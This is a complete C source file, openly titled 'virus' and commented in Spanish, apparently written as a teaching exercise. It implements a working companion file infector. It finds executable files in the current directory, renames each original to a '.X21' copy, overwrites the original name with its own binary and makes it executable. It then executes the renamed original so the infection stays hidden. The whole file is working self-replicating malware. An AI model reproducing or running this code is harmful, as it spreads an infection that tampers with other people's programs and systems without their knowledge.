/* virus - "Infectar" archivos ejecutables
 * Gabriel Altamirano
 *
*/
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

DIR *directorio;
struct dirent *archivo;
struct stat st;
int stst;
FILE *host, *virus;
long FileID;
char buf[512];
char *lc;
size_t amt_read;

int main(int argc, char *argv[], char *envp[]){
    directorio = opendir("."); //Abre el directorio actual - regresa un apuntador 
    if(directorio == NULL)
    {
        printf("Error: %s\n", strerror(errno)); //imprime el error asociado
        return 0; 				//Termina la ejecucion del programa
    }
    while ((archivo = readdir(directorio)) != NULL)
    {   // Lee los archivos en el directorio actual hasta que ya no hay mas archivos, donde :
        // @archivo - apuntador a una estructura de tipo dirent

        // Lee unicamente los archivos regulares que se encuentran en el directorio - man readdir
        if(8 == archivo->d_type)
        {   

            //stat - Regresa informacion acerca de un archivo y la almacena en st - man 2 stat
            if ((stst = stat((const char *)&archivo->d_name, &st)) == 0)
            {
                lc = (char *)&archivo->d_name; // lc apunta a la direccion de memoria del nombre del archivo
                while(*lc != '\0')	       //Incrementa la direccion de memoria hasta que llega al final de cadena
                	lc++;
                lc = lc - 3; 		       //Decrementa la direccion de memoria para validar el nombre del archivo

		// Si un archivo que es ejcutable , no contiene el posfijo X21, entonces vamos aqui 
                if((!((*lc == 'X') && (*(lc + 1) == '2') && (*(lc + 2) == '1'))) && ((st.st_mode&S_IXUSR) != 0))
		{ 
                    strcpy((char *)&buf, (char *)&archivo->d_name);
	            // Concatenamos el nombre del archivo con el posfijo X21, es decir 
                    strcat((char *)&buf, ".X21");
		    // Una vez que se define el nuevo nombre de archivo valida que exista
                    
		    if((host = fopen((char *)&buf, "r")) != NULL)
                        fclose(host);
		    // En caso contrario crea el nuevo archivo
                    else 
		    { 
			
			// El archivo original se renombra a file_name.X21
                        // esta linea permite crear un archivo con el contenido del original 
			// con todas sus caracteristcas			
			if(rename((char *)&archivo->d_name,(char *)&buf) == 0)
			{ 
		           // Ahora abrimos el archivo del virus
			   // Abrimos el virus en modo lectura
                           if((virus = fopen(argv[0], "r")) != NULL)
			   {	
				// Virus apunta a nuestro foco de infeccion y
			        // ahora abrimos el archivo sin prefijoX21 en modo escritura
                                if((host = fopen((char *)&archivo->d_name, "w")) != NULL)
				{
				    // virus apunta a nuestro foco de infeccion 
				    // host  apunta a nuestro archivo file_name.X21
				    
				    // Copiamos el contenido del virus al archivo infectado X21
				    // checa si se alcanza el final de archivo
                                    while (!feof(virus))
			            { 
                                        amt_read = 512;// Numero de datos a leer igual al tamaño del bufer
                                        amt_read = fread(&buf, 1, amt_read, virus);
					// Poner funcion printf y observar
                                        fwrite(&buf, 1, amt_read, host); 
                                    }
			            
                                     fclose(host);
                                     strcpy((char *)&buf, "./");
                                     strcat((char *)&buf, (char *)&archivo->d_name);
			             //Asigna los permisos correspondientes para la ejecucion del archivo
                                     chmod((char *)&buf, S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH); 
                               }
                               fclose(virus);
                           }
                        }
                    }
                }
            }
        }
   } 
    (void)closedir(directorio);
    if((strcmp(argv[0], "./virus")) != 0)
    {
        strcpy((char *)&buf, argv[0]);
        strcat((char *)&buf, ".X21");
        // Aqui tenemos la ejecucion del archivo verdader :)
	execve((char *)&buf, NULL, NULL);
    }
    return 0;
}
